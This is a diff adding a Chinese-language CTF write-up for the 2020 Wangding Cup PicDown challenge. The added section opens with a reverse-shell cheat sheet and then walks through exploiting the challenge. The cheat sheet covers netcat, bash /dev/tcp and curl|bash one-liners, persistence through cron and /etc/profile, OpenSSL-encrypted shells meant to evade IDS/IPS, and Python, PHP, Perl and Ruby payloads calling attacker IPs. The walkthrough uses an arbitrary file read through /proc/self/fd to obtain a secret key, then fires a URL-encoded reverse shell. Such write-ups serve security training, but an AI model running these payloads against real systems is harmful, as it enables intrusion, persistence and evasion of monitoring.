@@ -3834,3 +3834,235 @@ url解码之后就是 `?code=phpinfo();`
         $msg = "信息不全";
     }
     ```
+
+## 网鼎杯2020-白虎组PicDown(任意文件读取+shell反弹)
+
+- 反弹shell
+
+    参考[反弹Shell，看这一篇就够了](https://xz.aliyun.com/t/9488?time__1311=n4%2BxuDgD9AdWqhDBqDwmDUhRDB0rC3eDRioD&alichlgref=https%3A%2F%2Fwww.google.com.hk%2F)
+
+    *注意:攻击主机需要在防火墙中开启8080端口，而且攻击主机需要有公网IP或者与被攻击主机位于同一内网中，否则无法反弹shell*
+
+    1. 利用netcat反弹shell
+
+        下载安装netcat
+        ```sh
+        wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz
+        tar -xvzf netcat-0.7.1.tar.gz
+        ./configure
+        make && make install
+        make clean
+        ```
+
+        攻击机开启本地监听：
+        ```sh
+        nc -lvvp 8080
+        ```
+
+        目标主动连接攻击者
+        ```sh
+        netcat 221.xxx.xxx.82 8080 -e /bin/bash
+        # nc <攻击机IP> <攻击机监听的端口> -e /bin/bash
+        ```
+    2. 利用Bash反弹shell
+
+        反弹shell还有一种好用的方法就是使用bash结合重定向方法的一句话，具体命令如下
+        ```sh
+        bash -i >& /dev/tcp/221.xxx.xxx.82/4333 0>&1
+        #或
+        bash -c "bash -i >& /dev/tcp/221.xxx.xxx.82/4333 0>&1"
+        # bash -i >& /dev/tcp/攻击机IP/攻击机端口 0>&1
+        ```
+        攻击机开启本地监听：
+        `nc -lvvp 8080`
+
+        目标机主动连接攻击机：
+        `bash -i >& /dev/tcp/221.xxx.xxx.82/8080 0>&1`
+        并开启8080端口的监听。
+
+        然后再目标机上执行如下，即可反弹shell：
+        `curl 221.xxx.xxx.82|bash`
+    3. Curl配合Bash反弹shell
+        这里操作也很简单，借助了Linux中的管道。
+
+        首先，在攻击者vps的web目录里面创建一个index文件（index.php或index.html），内容如下：`bash -i >& /dev/tcp/47.xxx.xxx.72/8080 0>&1`
+        并开启8080端口的监听。
+
+        然后再目标机上执行如下，即可反弹shell：`curl 47.xxx.xxx.72|bash`
+        **将反弹shell的命令写入定时任务**
+
+        我们可以在目标主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 /var/spool/cron/[crontabs]/ 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。
+
+        比如，当前用户名为root，我们就要将下面内容写入到 `/var/spool/cron/root` 中。(centos系列主机)
+
+        比如，当前用户名为root，我们就要将下面内容写入到 `/var/spool/cron/crontabs/root` 中。(Debian/Ubuntu系列主机)
+
+        ```bash
+        */1  *  *  *  *   /bin/bash -i>&/dev/tcp/221.xxx.xxx.82/8080 0>&1
+        #每隔一分钟，向221.xxx.xxx.82的4333号端口发送shell
+        ```
+
+        **将反弹shell的命令写入/etc/profile文件**
+
+        将以下反弹shell的命写入/etc/profile文件中，/etc/profile中的内容会在用户打开bash窗口时执行。
+        ```bash
+        /bin/bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1 &
+        # 最后面那个&为的是防止管理员无法输入命令
+        ```
+    4. 使用OpenSSL反弹加密shell
+
+        在上文中，我们总结了很多反弹shell得方法，但是我发现这种反弹 shell 方式都有一个缺点，那就是所有的流量都是明文传输的。这些通过shell通过传输的流量都可以被管理员直接抓取并理解，当目标主机网络环境存在网络防御检测系统时（IDS、IPS等），网络防御检测系统会获取到我们的通信内容并进行告警和阻止。因此，我们需要对通信的内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密的 shell。
+
+        在利用 OpenSSL 反弹 shell 之前需要先生成自签名证书：
+        `openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes`
+
+        生成自签名证书时会提示输入证书信息，如果懒得填写可以一路回车即可
+
+        使用OpenSSL反弹加密shell
+        假设我们从目标机反弹 shell 到攻击机 。首先需要利用上一步生成的自签名证书，在攻击机上使用 OpenSSL 监听一个端口，在这里使用 8080 端口：
+        ```sh
+        openssl s_server -quiet -key key.pem -cert cert.pem -port 2333
+        ```
+        此时 OpenSSL 便在攻击机的 2333 端口上启动了一个 SSL/TLS server。
+
+        这时在目标机进行反弹 shell 操作，命令为：
+        ```sh
+        mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 47.xxx.xxx.72:2333 > /tmp/s; rm /tmp/s
+        ```
+        这样攻击者便使用 OpenSSL 反弹了目标机一个加密的 shell。
+
+    5. 反弹shell脚本
+
+        **下面这些脚本都是在目标主机上执行的**
+
+        python:
+        ```python
+        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.xxx.xxx.72",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+        ```
+        php:
+        ```php
+        php -r '$sock=fsockopen("47.xxx.xxx.72",2333);exec("/bin/sh -i <&3 >&3 2>&3");'
+        ```
+        perl:
+        ```perl
+        perl -e 'use Socket;$i="47.101.57.72";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+        ```
+        Ruby:
+        ```Ruby
+        ruby -rsocket -e 'c=TCPSocket.new("47.xxx.xxx.72","2333");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+        #或
+        ruby -rsocket -e 'exit if fork;c=TCPSocket.new("47.xxx.xxx.72","2333");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+        ```
+
+    6. 反弹shell后获取模拟终端
+
+        其实，上面所讲的各种方法获取的shell都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。
+
+        - 获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行sudo等命令，无法完成。
+        - 标准的错误输出无法显示，无法正常使用vim等文本编辑器等。
+        - 获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。
+
+        这往往都是因为我们获取的shell并不是标准的虚拟终端，为了能够完成输入密码等操作，我们必须模拟一个真正的终端设备。
+
+        我们其实可以借助于python默认包含的一个pty标准库来获取一个标准的虚拟终端环境。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。
+
+        我们只需在获取的shell里面输入如下命令，即可模拟一个终端设备：
+        ```python
+        python -c "import pty;pty.spawn('/bin/bash')"
+        ```
+
+1. 搜集（检查HTTP报文+查看初始页面HTML代码）
+
+   1. 尝试在输入框中填入数据提交，可以注意到参数名叫url。先输入普通链接发现没反应，看wp说本题环境用的是python的`urllib`，所以只填一个域名是不行
+
+   2. 输入`/etc/passwd`发现下了一个文件，只不过是以图片形式下的。图片打不开，说明这并不是图片文件，vscode中以二进制/文本格式打开，发现就是`/etc/passwd`文件内容。到这就清楚了，任意文件读取。如果用bp repeater模块重放的话，文件内容会直接展示出来。
+
+2. 从上面知道了有任意文件读取漏洞，那么首先通过proc查看系统进程信息。
+
+    ```sh
+    在linux中，proc是一个虚拟文件系统，也是一个控制中心，里面储存是当前内核运行状态的一系列特殊文件；该系统只存在内存当中，以文件系统的方式为访问系统内核数据的操作提供接口，可以通过更改其中的某些文件来改变内核运行状态。它也是内核提供给我们的查询中心，用户可以通过它查看系统硬件及当前运行的进程信息。
+    /proc/pid/cmdline 包含了用于开始进程的命令 ；
+    /proc/pid/cwd 包含了当前进程工作目录的一个链接 ；
+    /proc/pid/environ 包含了可用进程环境变量的列表 ；
+    /proc/pid/exe 包含了正在进程中运行的程序链接；
+    /proc/pid/fd/ 这个目录包含了进程打开的每一个文件的链接；
+    /proc/pid/mem 包含了进程在内存中的内容；
+    /proc/pid/stat 包含了进程的状态信息；
+    /proc/pid/statm 包含了进程的内存使用信息。
+    ```
+    payload: 
+    ```text
+    /page?url=/proc/self/cmdline
+    ```
+    输出：python2 app.py
+
+3. 读取 app.py 查看源码
+
+    1. 程序起始部分
+
+    在/tmp/secret.txt路径下读取了密钥，并且保存在SECRET_KEY变量里面，然后在系统上删除了源文件，导致我们无法通过任意文件读取漏洞获取密钥。但是没有关闭文件流f，所以我们能够在/proc/self/fd/xxx里找到进程打开的文件信息。
+
+    在 linux 系统中如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。
+    
+    proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。
+    还有的是一些以数字命名的目录，他们是进程目录。系统中当前运行的每一个进程都有对应的一个目录在/proc下，以进程的PID号为目录名，他们是读取进程信息的接口。而self目录则是读取进程本身的信息接口，是一个link而self目录则是读取进程本身的信息接口，是一个link
+
+    2. page函数
+
+    这个就是提交主页参数后进行的逻辑，使用url参数提交，可以重定向到输入的url。
+
+    3. manager函数
+
+    ```php
+    @app.route('/no_one_know_the_manager')
+    def manager():
+        key = request.args.get("key")
+        print(SECRET_KEY)
+        if key == SECRET_KEY:
+            shell = request.args.get("shell")
+            os.system(shell)
+            res = "ok"
+        else:
+            res = "Wrong Key!"
+
+        return res
+    ```
+
+    接口路由/no_one_know_the_manager，接口接收两个参数key和shell，如果key的值和之前读取的密钥SECRET_KEY相等，那么就调用os.system()函数执行shell参数传入的命令，但是不回显结果。需要反弹shell
+
+4. 解题
+
+    1. 利用`/no_one_know_the_manager`路由fantanshell执行系统命令，需要先获取secret key，读取`/proc/self/fd/3`
+
+        **linux 文件系统**
+
+        当一个新进程建立时，此进程将默认有 0，1，2 的文件描述符
+
+        |文件描述符|缩写|描述|
+        |-----|-----|-----|
+        |0|STDIN|标准输入|
+        |1|STDOUT|标准输出|
+        |2|STDERR|标准错误|
+
+        其实我们与计算机之间的交互是我可以输入一些指令之后它给我一些输出。
+        
+        > 我们可以把上面表格中的文件描述符0理解为我和计算机交互时的输入，而这个输入默认是指向键盘的; 文件描述符1理解为我和计算机交互时的输出，而这个输出默认是指向显示器的; 文件描述符2理解为我和计算机交互时，计算机出现错误时的输出，而这个输出默认是和文件描述符1指向一个位置
+
+        所以0，1，2一般会指向终端
+
+        当这个进程去打开一个新的文件时：
+
+        如果此时去打开一个新的文件，它的文件描述符会是 3 。POSIX 标准要求每次打开文件时（含socket）必须使用当前进程中最小可用的文件描述符号
+
+    2. 反弹shell
+
+        python反弹shell的payload如下：
+
+        ```bash
+        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("vps",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+        ```
+        payload需要url编码一下
+
+        ```bash
+        python%20-c%20%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22xx.xx.xx.xx%22,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27
+        ```
